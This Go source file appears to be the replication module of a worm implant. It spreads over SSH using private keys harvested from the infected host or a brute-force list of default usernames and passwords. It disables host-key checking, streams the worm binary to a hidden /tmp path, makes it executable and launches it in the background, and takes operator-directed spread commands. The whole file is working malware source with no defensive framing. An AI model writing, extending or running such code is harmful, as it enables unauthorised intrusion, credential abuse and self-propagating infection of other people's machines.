package replicator

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

// Go-native SSH spread: the implant talks SSH itself via x/crypto/ssh, so no
// ssh/sshpass binaries are required on the target. Supports private-key and
// password authentication and drops the worm payload over the session stdin.

func sshConnect(host, user string, auths []ssh.AuthMethod) (*ssh.Client, error) {
	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            auths,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         6 * time.Second,
	}
	addr := net.JoinHostPort(host, "22")
	return ssh.Dial("tcp", addr, cfg)
}

func keyAuths(keyPEM string) ([]ssh.AuthMethod, error) {
	signer, err := ssh.ParsePrivateKey([]byte(keyPEM))
	if err != nil {
		return nil, err
	}
	return []ssh.AuthMethod{ssh.PublicKeys(signer)}, nil
}

func passAuths(pass string) []ssh.AuthMethod {
	return []ssh.AuthMethod{ssh.Password(pass)}
}

// nativeDrop connects, streams the worm binary to a remote temp path, makes
// it executable and launches it. Returns the remote path on success.
func (r *Replicator) nativeDrop(host, user string, auths []ssh.AuthMethod) (string, error) {
	cl, err := sshConnect(host, user, auths)
	if err != nil {
		return "", err
	}
	defer cl.Close()

	sess, err := cl.NewSession()
	if err != nil {
		return "", err
	}
	defer sess.Close()

	r.mu.Lock()
	bin := r.binary
	r.mu.Unlock()
	if len(bin) == 0 {
		return "", fmt.Errorf("no payload staged")
	}

	exePath := "/tmp/.c" + randStr(6)
	cmdLine := fmt.Sprintf("cat > %s && chmod +x %s && nohup %s >/dev/null 2>&1 &", exePath, exePath, exePath)
	sess.Stdin = bytes.NewReader(bin)
	if err := sess.Run(cmdLine); err != nil {
		return "", err
	}
	return exePath, nil
}

// trySSHKey spreads with a harvested private key against root@host.
func (r *Replicator) trySSHKey(host, key string) bool {
	auths, err := keyAuths(key)
	if err != nil {
		return false
	}
	if _, err := r.nativeDrop(host, "root", auths); err != nil {
		return false
	}
	log.Printf("[replicator] ssh-key spread to %s", host)
	r.results <- SpreadResult{Method: "ssh-key", Target: host, Success: true, Output: "dropped via native ssh (key)"}
	return true
}

// trySSHPass spreads with a password against user@host.
func (r *Replicator) trySSHPass(host, user, pass string) bool {
	if _, err := r.nativeDrop(host, user, passAuths(pass)); err != nil {
		return false
	}
	log.Printf("[replicator] ssh-pass spread to %s@%s", user, host)
	r.results <- SpreadResult{Method: "ssh-pass", Target: host, Success: true, Output: "dropped via native ssh (password)"}
	return true
}

// DirectedSpread performs one operator-requested spread attempt against a
// specific target. vector: "ssh-key" | "ssh-pass". Returns a summary.
func (r *Replicator) DirectedSpread(target, vector, user, pass string) (string, error) {
	if target == "" {
		return "", fmt.Errorf("target required")
	}
	if err := r.stageBinary(); err != nil {
		return "", fmt.Errorf("cannot stage payload: %v", err)
	}
	switch vector {
	case "ssh-key", "ssh":
		keys := harvestSSHKeys()
		users := []string{"root"}
		if user != "" {
			users = []string{user}
		}
		if len(keys) == 0 {
			return "", fmt.Errorf("no ssh keys harvested on this host")
		}
		for _, u := range users {
			for _, k := range keys {
				auths, err := keyAuths(k)
				if err != nil {
					continue
				}
				if _, err := r.nativeDrop(target, u, auths); err == nil {
					return fmt.Sprintf("ssh-key spread ok: %s@%s", u, target), nil
				}
			}
		}
		return "", fmt.Errorf("ssh-key spread failed for %s", target)
	case "ssh-pass":
		users := []string{"root", "admin", "ubuntu", "ec2-user", "azureuser"}
		if user != "" {
			users = []string{user}
		}
		passes := []string{"root", "admin", "password", "123456", "vagrant", "toor", "Passw0rd!", "ubuntu"}
		if pass != "" {
			passes = []string{pass}
		}
		for _, u := range users {
			for _, p := range passes {
				if _, err := r.nativeDrop(target, u, passAuths(p)); err == nil {
					return fmt.Sprintf("ssh-pass spread ok: %s@%s", u, target), nil
				}
			}
		}
		return "", fmt.Errorf("ssh-pass spread failed for %s", target)
	default:
		return "", fmt.Errorf("unsupported vector %q (use ssh-key or ssh-pass)", vector)
	}
}
